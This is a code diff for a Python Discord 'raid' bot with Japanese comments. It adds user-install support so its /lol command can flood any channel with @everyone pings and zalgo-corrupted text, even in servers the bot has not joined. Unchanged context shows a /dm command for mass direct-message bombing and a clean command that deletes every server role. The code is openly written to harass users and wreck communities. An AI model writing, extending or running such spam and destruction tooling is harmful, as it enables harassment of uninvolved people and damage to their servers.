@@ -3,6 +3,7 @@ from discord.ext import commands
 from discord import app_commands
 import random
 import os
+import asyncio
 
 # ボットの設定
 intents = discord.Intents.default()
@@ -118,9 +119,11 @@ async def lol(ctx, count: int = 100, *, message: str = None):
         print(f"エラーが発生しました: {e}")
 
 # =============================================
-# /lol スラッシュコマンド
+# /lol スラッシュコマンド（ユーザーインストール対応）
 # =============================================
 @bot.tree.command(name="lol", description="メッセージ連投・投票爆撃")
+@app_commands.allowed_installs(guilds=True, users=True)
+@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
 async def slash_lol(
     interaction: discord.Interaction,
@@ -131,9 +134,47 @@ async def slash_lol(
     await interaction.response.defer(ephemeral=True)
 
     try:
-        import asyncio
         guild = interaction.guild
 
+        zalgo_marks = [
+            '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307',
+            '\u0308', '\u0309', '\u030A', '\u030B', '\u030C', '\u030D', '\u030E', '\u030F',
+            '\u0310', '\u0311', '\u0312', '\u0313', '\u0314', '\u0315', '\u0316', '\u0317',
+            '\u0318', '\u0319', '\u031A', '\u031B', '\u031C', '\u031D', '\u031E', '\u031F',
+            '\u0320', '\u0321', '\u0322', '\u0323', '\u0324', '\u0325', '\u0326', '\u0327',
+            '\u0328', '\u0329', '\u032A', '\u032B', '\u032C', '\u032D', '\u032E', '\u032F',
+            '\u0330', '\u0331', '\u0332', '\u0333', '\u0334', '\u0335', '\u0336', '\u0337',
+            '\u0338', '\u0339', '\u033A', '\u033B', '\u033C', '\u033D', '\u033E', '\u033F'
+        ]
+
+        # =============================================
+        # ボットがサーバーに入っていない場合 → 使われたチャンネルだけで発動
+        # =============================================
+        if guild is None or guild.me is None:
+            channel = interaction.channel
+            if channel is None:
+                await interaction.followup.send("❌ チャンネルが取得できませんでした", ephemeral=True)
+                return
+
+            if message:
+                spam_text = f"@everyone {message}"
+            else:
+                base_text = "w" * 50 + "\n" + "a" * 100
+                zalgo_text = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(15)) for c in base_text)
+                spam_text = f"@everyone {zalgo_text}"
+
+            spam_tasks = [channel.send(spam_text) for _ in range(count)]
+            results = await asyncio.gather(*spam_tasks, return_exceptions=True)
+            success_count = sum(1 for r in results if not isinstance(r, Exception))
+            await interaction.followup.send(
+                f"✅ このチャンネルに{success_count}回送信しました",
+                ephemeral=True
+            )
+            return
+
+        # =============================================
+        # ボットがサーバーに入っている場合 → 全チャンネルに発動
+        # =============================================
         target_channels = []
 
         for channel in guild.channels:
@@ -168,16 +209,6 @@ async def slash_lol(
                 spam_text = f"@everyone {message}"
             else:
                 base_text = "w" * 50 + "\n" + "a" * 100
-                zalgo_marks = [
-                    '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307',
-                    '\u0308', '\u0309', '\u030A', '\u030B', '\u030C', '\u030D', '\u030E', '\u030F',
-                    '\u0310', '\u0311', '\u0312', '\u0313', '\u0314', '\u0315', '\u0316', '\u0317',
-                    '\u0318', '\u0319', '\u031A', '\u031B', '\u031C', '\u031D', '\u031E', '\u031F',
-                    '\u0320', '\u0321', '\u0322', '\u0323', '\u0324', '\u0325', '\u0326', '\u0327',
-                    '\u0328', '\u0329', '\u032A', '\u032B', '\u032C', '\u032D', '\u032E', '\u032F',
-                    '\u0330', '\u0331', '\u0332', '\u0333', '\u0334', '\u0335', '\u0336', '\u0337',
-                    '\u0338', '\u0339', '\u033A', '\u033B', '\u033C', '\u033D', '\u033E', '\u033F'
-                ]
                 zalgo_text = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(15)) for c in base_text)
                 spam_text = f"@everyone {zalgo_text}"
 
@@ -259,16 +290,6 @@ async def slash_lol(
                 spam_text = f"@everyone {message}"
             else:
                 base_text = "w" * 50 + "\n" + "a" * 100
-                zalgo_marks = [
-                    '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307',
-                    '\u0308', '\u0309', '\u030A', '\u030B', '\u030C', '\u030D', '\u030E', '\u030F',
-                    '\u0310', '\u0311', '\u0312', '\u0313', '\u0314', '\u0315', '\u0316', '\u0317',
-                    '\u0318', '\u0319', '\u031A', '\u031B', '\u031C', '\u031D', '\u031E', '\u031F',
-                    '\u0320', '\u0321', '\u0322', '\u0323', '\u0324', '\u0325', '\u0326', '\u0327',
-                    '\u0328', '\u0329', '\u032A', '\u032B', '\u032C', '\u032D', '\u032E', '\u032F',
-                    '\u0330', '\u0331', '\u0332', '\u0333', '\u0334', '\u0335', '\u0336', '\u0337',
-                    '\u0338', '\u0339', '\u033A', '\u033B', '\u033C', '\u033D', '\u033E', '\u033F'
-                ]
                 zalgo_text = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(15)) for c in base_text)
                 spam_text = f"@everyone {zalgo_text}"
 
@@ -290,9 +311,11 @@ async def slash_lol(
         print(f"スラッシュコマンドエラー: {e}")
 
 # =============================================
-# /dm コマンド
+# /dm コマンド（サーバーに入っている場合のみ）
 # =============================================
-@bot.tree.command(name="dm", description="サーバー全員にDM爆撃")
+@bot.tree.command(name="dm", description="サーバー全員にDM爆撃（ボットがサーバーに参加している場合のみ）")
+@app_commands.allowed_installs(guilds=True, users=True)
+@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
 async def slash_dm(
     interaction: discord.Interaction,
@@ -302,8 +325,11 @@ async def slash_dm(
     await interaction.response.defer(ephemeral=True)
 
     try:
-        import asyncio
         guild = interaction.guild
+
+        if guild is None or guild.me is None:
+            await interaction.followup.send("❌ このコマンドはボットがサーバーに参加している場合のみ使えます", ephemeral=True)
+            return
 
         members = [m for m in guild.members if not m.bot]
 
@@ -341,8 +367,6 @@ async def clean(ctx):
     guild = ctx.guild
 
     try:
-        import asyncio
-
         role_delete_tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
         await asyncio.gather(*role_delete_tasks, return_exceptions=True)
         print(f"全ロール削除完了")
@@ -395,7 +419,6 @@ async def clean(ctx):
 # =============================================
 # 起動
 # =============================================
-# Render用のダミーHTTPサーバー
 from threading import Thread
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
